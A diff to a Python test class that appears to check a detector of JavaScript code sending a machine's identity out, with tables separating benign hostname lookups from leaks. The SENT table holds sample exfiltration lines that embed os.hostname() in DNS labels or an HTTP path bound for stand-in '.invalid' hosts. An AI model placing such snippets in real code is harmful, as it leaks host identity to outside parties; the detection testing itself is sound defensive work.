@@ -275,6 +275,10 @@ class TestIdentityAsDestination:
     )
     DESTINATIONS: ClassVar[dict[str, str]] = {
         "own name looked up": "dns.lookup(os.hostname(), (e, a) => {});\n",
+        # An SSDP client resolving its own name to bind its socket, the modules required inline.
+        "own name looked up inline": (
+            'require("dns").lookup(require("node:os").hostname(), (e, a) => {});\n'
+        ),
         "socket host option": "net.connect({host: ip, port: 9100});\n",
         "socket shorthand": "const host = ip;\nnet.connect({host, port: 9100});\n",
         "socket positional": "net.connect(9100, ip);\n",
@@ -293,6 +297,9 @@ class TestIdentityAsDestination:
     }
     SENT: ClassVar[dict[str, str]] = {
         "name labels": 'dns.lookup(os.hostname() + ".x.invalid", () => {});\n',
+        "name labels inline": (
+            'require("dns").lookup(require("os").hostname() + ".x.invalid", () => {});\n'
+        ),
         "name labels in a template": "dns.lookup(`${os.hostname()}.x.invalid`, () => {});\n",
         "path": 'http.request({hostname: "h.invalid", path: "/p?h=" + os.hostname()});\n',
         "hostname labels": 'http.request({hostname: os.hostname() + ".x.invalid"});\n',
